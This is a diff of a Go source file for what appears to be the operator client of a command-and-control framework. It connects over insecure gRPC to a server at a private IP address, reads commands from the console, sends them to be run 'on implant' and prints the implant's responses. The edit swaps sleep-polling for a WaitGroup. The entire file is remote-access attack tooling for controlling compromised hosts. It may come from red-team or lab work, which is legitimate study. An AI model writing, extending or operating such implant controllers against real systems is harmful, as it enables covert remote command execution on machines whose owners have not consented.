@@ -1,11 +1,13 @@
 package main
 
 import (
+	"bufio"
 	"context"
 	"fmt"
-	"io"
 	"log"
-	"time"
+	"os"
+	"strings"
+	"sync"
 
 	pb "github.com/bartimus-primed/proto/pb"
 	"google.golang.org/grpc"
@@ -17,9 +19,9 @@ const (
 )
 
 var recv bool = false
+var shouldExit bool = false
 
 func main() {
-
 	conn, err := grpc.Dial("192.168.253.1:50551", grpc.WithInsecure())
 	if err != nil {
 		log.Fatalf("did not connect: %v", err)
@@ -31,44 +33,38 @@ func main() {
 	if err != nil {
 		panic(err.Error())
 	}
-	waitc := make(chan struct{})
-	var command_to_run = ""
-
+	var waitgroup sync.WaitGroup
+	command_buff := bufio.NewReader(os.Stdin)
+	command_to_run := ""
 	go func() {
 		for {
-			resp, err := stream.Recv()
-			if err == io.EOF {
-				close(waitc)
-				return
-			}
-			if err != nil {
-				println(err)
-			}
-			if resp != nil {
-				println("Received: ", resp.Resp)
-				recv = true
-				if resp.Resp == "exit" {
-					stream.CloseSend()
+			resp, _ := stream.Recv()
+			if resp.Resp != "" {
+				fmt.Println("\nReceived: ", resp.GetResp())
+				if resp.GetResp() == "exit" {
+					shouldExit = true
+					conn.Close()
 				}
 			}
+			waitgroup.Done()
+			recv = true
 		}
 	}()
-	for command_to_run != "exit" {
-		if command_to_run != "exit" {
-			fmt.Print("Enter command to run on implant: ")
-			recv = false
-		} else {
-			stream.CloseSend()
-			<-waitc
-		}
-		fmt.Scanln(&command_to_run)
-		stream.Send(&pb.Command{
-			Cmd:      command_to_run,
+	for !shouldExit {
+		fmt.Print("Enter command to run on implant: ")
+		recv = false
+		cmd_input, _ := command_buff.ReadString('\n')
+		command_to_run = strings.Replace(cmd_input, "\n", "", -1)
+		command_to_run = strings.TrimSpace(command_to_run)
+		fmt.Println(fmt.Sprintln(command_to_run))
+		cmd := &pb.Command{
+			Cmd:      fmt.Sprintln(command_to_run),
 			Timeout:  5,
 			SendResp: true,
-		})
-		for recv != true {
-			time.Sleep(time.Second)
 		}
+		waitgroup.Add(1)
+		stream.Send(cmd)
+		waitgroup.Wait()
 	}
+	stream.CloseSend()
 }
